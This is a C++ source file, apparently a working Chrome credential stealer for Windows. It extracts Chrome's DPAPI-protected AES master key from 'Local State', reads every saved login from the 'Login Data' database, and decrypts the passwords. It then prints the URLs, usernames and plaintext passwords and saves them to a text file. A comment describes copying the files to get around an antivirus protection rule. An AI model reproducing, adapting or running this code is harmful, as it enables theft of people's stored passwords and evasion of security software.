#include <string>
#include <windows.h>
#include <iostream>
#include <shlobj.h>
#include <fstream>
//slproweb.com/download/Win32OpenSSL-3_1_0.exe
#include <openssl/evp.h>

#include "json.hpp"
#include "base64.h"
#include "sqlite3.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib,"libcrypto.lib") //libcrypto-3.dll

using namespace std;

string key;
string iv;
string decrypt_password(char* password,int length) {
    if (length < 16) return "";

    string ciphertext(password, length);
    iv = ciphertext.substr(3, 15);
    ciphertext = ciphertext.substr(15);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr);
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, (const unsigned char*)key.c_str(), (const unsigned char*)iv.c_str());

    char outbuf[512] = {0};
    int outlen;
    EVP_DecryptUpdate(ctx, (unsigned char*)outbuf, &outlen, (const unsigned char*)ciphertext.c_str(), ciphertext.size());

    EVP_CIPHER_CTX_free(ctx);

    ZeroMemory(outbuf + outlen - 16, 16);

    return outbuf;
}

string getKey(const char* path) {
    ifstream f(path);
    string bin_key = base64_decode(nlohmann::json::parse(f)["os_crypt"]["encrypted_key"]);
    f.close();
    
    bin_key = bin_key.substr(5);

    DATA_BLOB encrypted_blob;
    encrypted_blob.cbData = static_cast<DWORD>(bin_key.size());
    encrypted_blob.pbData = reinterpret_cast<byte*>(const_cast<char*>(bin_key.data()));

    DATA_BLOB decrypted_blob;
    if (!CryptUnprotectData(&encrypted_blob,nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &decrypted_blob)) {
        return "";
    }

    string decrypted_string(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
    LocalFree(decrypted_blob.pbData);

    return decrypted_string;
}

int main() {
    //获取路径
    char szPath[MAX_PATH];
    SHGetFolderPathA(0, CSIDL_LOCAL_APPDATA, 0, 0, szPath);

    string Local_State = szPath;
    Local_State += "\\Google\\Chrome\\User Data\\Local State";

    string Login_Data = szPath;
    Login_Data += "\\Google\\Chrome\\User Data\\Default\\Login Data";

    //火绒的自定义防护规则会导致sqlite3_open失败，这里将文件拷贝到同目录再读取
    CopyFileA(Local_State.c_str(), "Local State", 0);
    CopyFileA(Login_Data.c_str(), "Login Data", 0);

    //获取AES key
    key = getKey("Local State");

    //读取Login Data
    sqlite3* db = NULL;
    sqlite3_open_v2("Login Data", &db, SQLITE_OPEN_READONLY, 0);

    sqlite3_stmt* stmt;
    sqlite3_prepare_v2(db, "select origin_url, action_url, username_value, password_value from logins order by date_last_used desc;", -1, &stmt, NULL);

    //输出
    string outfile = "ChromePasswd-"+ to_string((unsigned)time(0)) + ".txt";
    ofstream fout(outfile);

    string de;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char* a = sqlite3_column_text(stmt, 0);
        const unsigned char* b = sqlite3_column_text(stmt, 1);
        const unsigned char* c = sqlite3_column_text(stmt, 2);

        cout << "origin_url: " << a << "\n";
        cout << "action_url: " << b << "\n";
        cout << "username_value: " << c << "\n";

        //read blob data then decrypt it
        char* blob;
        blob = (char*)sqlite3_column_blob(stmt, 3);
        int blob_len;
        blob_len = sqlite3_column_bytes(stmt, 3);

        de = decrypt_password(blob, blob_len);

        cout <<"password: "<< de <<"\n\n\n";

        //write to file
        fout << "origin_url: " << a << "\n";
        fout << "action_url: " << b << "\n";
        fout << "username_value: " << c << "\n";
        fout << "username_value: " << de << "\n\n\n";
    }
    sqlite3_close(db);
    fout.close();

    DeleteFileA("Local State");
    DeleteFileA("Login Data");

    system("pause");
}
